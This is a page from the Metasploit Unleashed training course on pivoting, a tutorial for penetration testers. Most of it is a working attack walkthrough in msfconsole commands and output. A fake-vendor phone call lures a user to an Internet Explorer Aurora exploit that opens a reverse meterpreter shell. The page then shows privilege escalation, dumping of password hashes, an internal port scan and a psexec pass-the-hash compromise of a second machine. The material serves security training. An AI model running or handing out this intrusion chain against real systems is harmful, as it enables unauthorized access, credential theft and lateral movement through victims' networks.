
		<!DOCTYPE html>
		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
		<head>
			<title>Pivoting - Metasploit Unleashed</title>
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		</head>

		<body>
			<div id="wrapper">
			
				<div id="header">
					<div id="header-content">
						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
						<div class="tagline">Mastering the Framework</div>
						<div class="clear"></div>
					</div>
				</div>
				
				<div id="page">
					<div id="right-box">
						
						<div id="controls">
									<ul>
			<li id="ca-nstab-main" class="selected"><a href="Pivoting" title="View the content page [c]" accesskey="c">Page</a></li>
			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Pivoting&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
		</ul>
							
							<div class="portlet" id="p-personal">
								<div class="pBody">
								<ul>
																	</ul>
								</div>
							</div>
							
							<div class="search">
									<div id="p-search" class="portlet">
		<div id="searchBody" class="pBody">
			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
			</form>
		</div>
	</div>
							</div>
							
							<div class="clear"></div>
						</div>
					
						<a id="top"></a>
						
						<div id="content">
							<h1>Pivoting</h1>
						
							<div id="siteSub">From Metasploit Unleashed</div>
							<div id="contentSub"></div>
																													<div id="jump-to-nav">Jump to: <a href="Pivoting#column-one">navigation</a>, <a href="Pivoting#searchInput">search</a></div>
														<!-- start content -->
							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Pivoting is the unique technique of using an instance (also referred to as a 'plant' or 'foothold') to be able to "move" around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems. In this scenario we will be using it for routing traffic from a normally non-routable network.
<br />
<br />
For example, we are a pentester for Security-R-Us. You pull the company directory and decide to target a user in the target IT department. You call up the user and claim you are from a vendor and would like them to visit your website in order to download a security patch. At the URL you are pointing them to, you are running an Internet Explorer exploit. 
<br />
<br />
<pre>msf > <span style='color:#13C16A;'>use exploit/windows/browser/ms10_002_aurora</span> 
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>show options</span>

Module options:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0          yes       The local host to listen on.
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL for incoming connections
   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                      no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set URIPATH /</span>
URIPATH => /
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/reverse_tcp</span>
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set LHOST 192.168.1.101</span>
LHOST => 192.168.1.101
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>exploit -j</span>
<span style='color:#0000FF;'>[*]</span> Exploit running as background job.

<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:4444 
<span style='color:#0000FF;'>[*]</span> Using URL: http://0.0.0.0:8080/
<span style='color:#0000FF;'>[*]</span>  Local IP: http://192.168.1.101:8080/
<span style='color:#0000FF;'>[*]</span> Server started.
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre>
<br />
When the target visits our malicious URL, a meterpreter session is opened for us giving full access the the system.
<br />
<br />
<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > 
<span style='color:#0000FF;'>[*]</span> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
<span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes) to 192.168.1.201
<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.201:8777) at Mon Dec 06 08:22:29 -0700 2010

msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>sessions -l</span>

Active sessions
===============

  Id  Type                   Information                                      Connection
  --  ----                   -----------                                      ----------
  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777

msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre>
<br />
When we connect to our meterpreter session, we run ipconfig and see that the exploited system is dual-homed, a common configuration amongst IT staff.
<br />
<br />
<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>sessions -i 1</span>
<span style='color:#0000FF;'>[*]</span> Starting interaction with 1...

<u>meterpreter</u> > <span style='color:#13C16A;'>ipconfig</span>

Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
Hardware MAC: d2:d6:70:fa:de:65
IP Address  : 10.1.13.3
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: c6:ce:4e:d9:c9:6e
IP Address  : 192.168.1.201
Netmask     : 255.255.255.0


<u>meterpreter</u> ></pre>
<br />
We want to leverage this newly discovered information and attack this additional network. Metasploit has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -h</span>
<span style='color:#0000FF;'>[*]</span> Usage:   run autoroute [-r] -s subnet -n netmask
<span style='color:#0000FF;'>[*]</span> Examples:
<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
<span style='color:#0000FF;'>[*]</span>   run autoroute -p                            # Print active routing table
<span style='color:#0000FF;'>[*]</span>   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
<span style='color:#0000FF;'>[*]</span> Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
<u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -s 10.1.13.0/24</span>
<span style='color:#0000FF;'>[*]</span> Adding a route to 10.1.13.0/255.255.255.0...
<span style='color:#00ff00;'>[+]</span> Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
<span style='color:#0000FF;'>[*]</span> Use the -p option to list all active routes
<u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -p</span>

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.13.0          255.255.255.0      Session 1

<u>meterpreter</u> ></pre>
<br />
Now that we have added our additional route, we will escalate to SYSTEM, dump the password hashes, and background our meterpreter session by pressing Ctrl-z.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#13C16A;'>getsystem</span>
...got system (via technique 1).
<u>meterpreter</u> > <span style='color:#13C16A;'>run hashdump</span>
<span style='color:#0000FF;'>[*]</span> Obtaining the boot key...
<span style='color:#0000FF;'>[*]</span> Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
<span style='color:#0000FF;'>[*]</span> Obtaining the user list and keys...
<span style='color:#0000FF;'>[*]</span> Decrypting user keys...
<span style='color:#0000FF;'>[*]</span> Dumping password hashes...


Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9a6ae26408b0629ddc621c90c897b42d:07a59dbe14e2ea9c4792e2f189e2de3a:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f5350160:::
victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::


<u>meterpreter</u> > 
Background session 1? [y/N]  
msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre> 
<br />
Now we need to determine if there are other systems on this second network we have discovered. We will use a basic TCP port scanner to look for ports 139 and 445.
<br />
<br />
<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>use auxiliary/scanner/portscan/tcp</span> 
msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>show options</span>

Module options:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
   VERBOSE      false            no        Display verbose output

msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set RHOSTS 10.1.13.0/24</span>
RHOST => 10.1.13.0/24
msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set PORTS 139,445</span>
PORTS => 139,445
msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set THREADS 50</span>
THREADS => 50
msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>run</span>

<span style='color:#0000FF;'>[*]</span> 10.1.13.3:139 - TCP OPEN
<span style='color:#0000FF;'>[*]</span> 10.1.13.3:445 - TCP OPEN
<span style='color:#0000FF;'>[*]</span> 10.1.13.2:445 - TCP OPEN
<span style='color:#0000FF;'>[*]</span> 10.1.13.2:139 - TCP OPEN
<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
msf auxiliary(<span style='color:#ff0000;'>tcp</span>) ></pre> 
<br />
We have discovered an additional machine on this network with ports 139 and 445 open so we will try to re-use our gathered password hash with the psexec exploit module.  Since many companies use imaging software, the local Administrator password is frequently the same across the entire enterprise.
<br />
<br />
<pre>msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>use exploit/windows/smb/psexec</span> 
msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>show options</span>

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOST                       yes       The target address
   RPORT      445              yes       Set the SMB service port
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(<span style='color:#ff0000;'>psexec</span>) ><span style='color:#13C16A;'> set RHOST 10.1.13.2</span>
RHOST => 10.1.13.2
msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set SMBUser Administrator</span>
SMBUser => Administrator
msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d</span>
SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/bind_tcp</span>
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>exploit</span>

<span style='color:#0000FF;'>[*]</span> Connecting to the server...
<span style='color:#0000FF;'>[*]</span> Started bind handler
<span style='color:#0000FF;'>[*]</span> Authenticating to 10.1.13.2:445|WORKGROUP as user 'Administrator'...
<span style='color:#0000FF;'>[*]</span> Uploading payload...
<span style='color:#0000FF;'>[*]</span> Created \qNuIKByV.exe...
<span style='color:#0000FF;'>[*]</span> Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
<span style='color:#0000FF;'>[*]</span> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
<span style='color:#0000FF;'>[*]</span> Obtaining a service manager handle...
<span style='color:#0000FF;'>[*]</span> Creating a new service (UOtrbJMd - "MNYR")...
<span style='color:#0000FF;'>[*]</span> Closing service handle...
<span style='color:#0000FF;'>[*]</span> Opening service...
<span style='color:#0000FF;'>[*]</span> Starting the service...
<span style='color:#0000FF;'>[*]</span> Removing the service...
<span style='color:#0000FF;'>[*]</span> Closing service handle...
<span style='color:#0000FF;'>[*]</span> Deleting \qNuIKByV.exe...
<span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes)
<span style='color:#0000FF;'>[*]</span> Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010

<u>meterpreter</u> ></pre>
<br />
Our attack has been successful! You can see in the above output that we have a meterpreter session connecting to 10.1.13.2 via our existing meterpreter session with 192.168.1.201. Running ipconfig on our newly compromised machine shows that we have reached a system that is not normally accessible to us.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#13C16A;'>ipconfig</span>

Citrix XenServer PV Ethernet Adapter
Hardware MAC: 22:73:ff:12:11:4b
IP Address  : 10.1.13.2
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0


<u>meterpreter</u> ></pre>
<br />
As you can see, pivoting is an extremely powerful feature and is a critical capability to have on penetration tests.
<br />
<br />
</p>
<hr />
<p><br />
























</p>
<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Pivoting</div>
<p>










































</p>
<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <strong class="selflink">Pivoting</strong> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
<p>









































</p>
<div class="Total3"><a href="Portfwd" title="Portfwd">Portfwd</a></div>
<p>


















</p>
<!-- 
NewPP limit report
Preprocessor visited node count: 538/1000000
Preprocessor generated node count: 2783/1000000
Post‐expand include size: 3588/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 3/40
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:65-0!*!0!*!*!*!* and timestamp 20131123203346 -->
</div><div class="printfooter">
Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;oldid=421">http://www.offensive-security.com/w/index.php?title=Pivoting&amp;oldid=421</a>"</div>
							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
													</div>
						
					</div>
				
					<div id="left-box">
								<ul id="nav">
				<li><a href="Donate" class="root">Donate</a></li>
				<li>
					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
					<div class="menu two-column">
						<h3>Introduction</h3>
						<ul class="one">
							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
								<ul class="two small">
									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
								</ul>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
					<div class="menu two-column">
						<h3>Required Materials</h3>
						<ul class="one">
							<li><a href="Metasploitable">Metasploitable</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
					<div class="menu four-column">
						<h3>Metasploit Fundamentals</h3>
						<ul class="one">
							<li><a href="Msfcli">Msfcli</a></li>
							<li><a href="Msfconsole">Msfconsole</a>
								<ul class="two small">
									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Exploits">Exploits</a>
								<ul class="two">
									<li><a href="Using_Exploits">Using Exploits</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Payloads">Payloads</a>
								<ul class="two small">
									<li><a href="Payload_Types">Payload Types</a></li>
									<li><a href="Generating_Payloads">Generating Payloads</a></li>
								</ul>
								<div class="clear"></div>
							</li>
                                                        <li><a href="Databases">Databases</a>
                                                                <ul class="two small">
                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
							<li><a href="About_Meterpreter">About Meterpreter</a>
								<ul class="two">
									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
					<div class="menu two-column">
						<h3>Information Gathering</h3>
						<ul class="one">
							<li><a href="Port_Scanning">Port Scanning</a></li>
							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
							<li><a href="Service_Identification">Service Identification</a></li>
							<li><a href="Password_Sniffing">Password Sniffing</a>
								<ul class="two">
									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
					<div class="menu two-column">
						<h3>Vulnerability Scanning</h3>
						<ul class="one">
							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
							<li><a href="VNC_Authentication">VNC Authentication</a></li>
							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
		     		                                <ul class="two small">
                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							</li>
                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
								<ul class="two small">
									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
					<div class="menu two-column">
						<h3>Writing a Simple Fuzzer</h3>
						<ul class="one">
							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
					<div class="menu two-column">
						<h3>Exploit Development</h3>
						<ul class="one">
							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
							<li><a href="Exploit_Format">Exploit Format</a></li>
							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
							<li><a href="Exploit_Targets">Exploit Targets</a></li>
							<li><a href="Exploit_Payloads">Exploit Payloads</a>
								<ul class="two small">
									<li><a href="Msfvenom">Msfvenom</a></li>
									<li><a href="Msfpayload">Msfpayload</a></li>
									<li><a href="Msfencode">Msfencode</a></li>
									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
									<li><a href="Msfrop">Msfrop</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
								<ul class="two small">
									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
								<ul class="two small">
									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Porting_Exploits">Porting Exploits</a></li>
						</ul>
					</div>
				</li>
                                <li>
                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
                                        <div class="menu two-column">
                                                <h3>Client-side Exploits</h3>
                                                <ul class="one">
                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
                                                </ul>
                                        </div>
                                </li>
				<li>
					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
					<div class="menu three-column">
						<h3>Client Side Attacks</h3>
						<ul class="one">
							<li><a href="Binary_Payloads">Binary Payloads</a></li>
							<ul class="two small">
								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
							</ul>
							<div class="clear"></div>
							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
					<div class="menu two-column">
						<h3>MSF Post Exploitation</h3>
						<ul class="one">
							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
							<li><a href="Event_Log_Management">Event Log Management</a></li>
							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
								<ul class="two small">
									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
							<li><a href="Pivoting">Pivoting</a></li>
                                                                <ul class="two small">
                                                                        <li><a href="Portfwd">Portfwd</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							<li><a href="TimeStomp">TimeStomp</a></li>
							<li><a href="Screen_Capture">Screen Capture</a></li>
							<li><a href="Searching_For_Content">Searching For Content</a></li>
							<li><a href="John_The_Ripper">John The Ripper</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
					<div class="menu two-column">
						<h3>Meterpreter Scripting</h3>
						<ul class="one">
							<li><a href="Existing_Scripts">Existing Scripts</a></li>
							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
							<li><a href="Custom_Scripting">Custom Scripting</a></li>
							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
							<li><a href="Useful_Functions">Useful Functions</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
					<div class="menu two-column">
						<h3>Maintaining Access</h3>
						<ul class="one">
							<li><a href="Keylogging">Keylogging</a></li>
							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
						        <ul class="two small">
								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
							</ul>
								 <div class="clear"></div>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
					<div class="menu two-column">
						<h3>MSF Extended Usage</h3>
						<ul class="one">
							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
							<li><a href="Karmetasploit">Karmetasploit</a>
								<ul class="two small">
									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
									<li><a href="Attack_Analysis">Attack Analysis</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
							<li><a href="Building_A_Module">Building A Module</a>
								<ul class="two small">
									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
					<div class="menu two-column">
						<h3>Metasploit GUIs</h3>
						<ul class="one">
							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
								<ul class="two small">
                                                                        <li><a href="Scanning">Scanning</a></li>
                                                                        <li><a href="Exploitation">Exploitation</a></li>
                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
                                                                </ul>
								<div class="clear"></div>
                                                        </li>
							<li><a href="Armitage">Armitage</a>
                                                                <ul class="two small">
                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
								</ul>
							</li>
						</ul>
					</div>
				</li>
				<li><a href="About_The_Authors" class="root">About The Authors</a>
					<div class="menu two-column">
						<h3>About the Authors</h3>
						<ul class="one">
							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
							<li><a href="William_Coppola">William Coppola</a></li>
							<li><a href="Paul_Hand">Paul Hand</a></li>
							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
							<li><a href="Devon_Kearns">Devon Kearns</a></li>
							<li><a href="David_Kennedy">David Kennedy</a></li>
							<li><a href="Steven_McElrea">Steven McElrea</a></li>
							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
							<li><a href="David_Ovitz">David Ovitz</a></li>
							<li><a href="Carlos_Perez">Carlos Perez</a></li>
						</ul>
					</div>
				</li>
                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
                                        <div class="menu three-column">
                                                <h3>Post Module Reference</h3>
                                                <ul class="one">
                                                        <li>Windows   
                                                                <ul class="two">
                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Linux
                                                                <ul class="two">
                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>OS X
                                                                <ul class="two">
